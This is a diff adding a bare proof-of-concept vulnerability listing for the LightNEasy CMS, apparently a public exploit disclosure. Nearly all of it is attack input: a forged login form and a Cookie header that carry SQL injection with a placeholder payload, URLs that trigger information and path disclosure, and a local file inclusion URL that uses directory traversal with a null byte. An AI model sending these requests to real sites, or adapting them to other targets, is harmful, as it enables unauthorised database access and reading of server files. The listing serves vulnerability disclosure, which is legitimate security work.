@@ -1,0 +1,43 @@
+SQl Injection:
+
+POC 1.
+
+<form action="http://www.example.com/LightNEasy.php?do=login" method="post" name="main" >  
+<input type="hidden" name="handle" value='123"SQL_CODE_HERE'/>  
+<input type="hidden" name="password" value="1"/>  
+<input type="hidden" name="do" value="login"/>  
+<input type="submit" value="submit" name="submit" />  
+</form>  
+
+POC 2.
+
+GET / HTTP/1.1  
+Cookie: userhandle=123"SQL_CODE_HERE
+
+#######################################################################################################################
+
+Information disclosure:
+
+POC.
+
+http://www.example.com/LightNEasy.php?page=1\
+
+#######################################################################################################################
+
+Path disclosure:
+
+POC.
+
+http://www.example.com/addons/contact/main.php  
+http://www.example.com/addons/downloads/main.php  
+http://www.example.com/addons/gallery/main.php 
+
+#######################################################################################################################
+
+Local File Include:
+
+POC.
+
+http://www.example.com/addons/contact/main.php?set[language]=/../../../../../../gpl.txt%00
+
+#######################################################################################################################
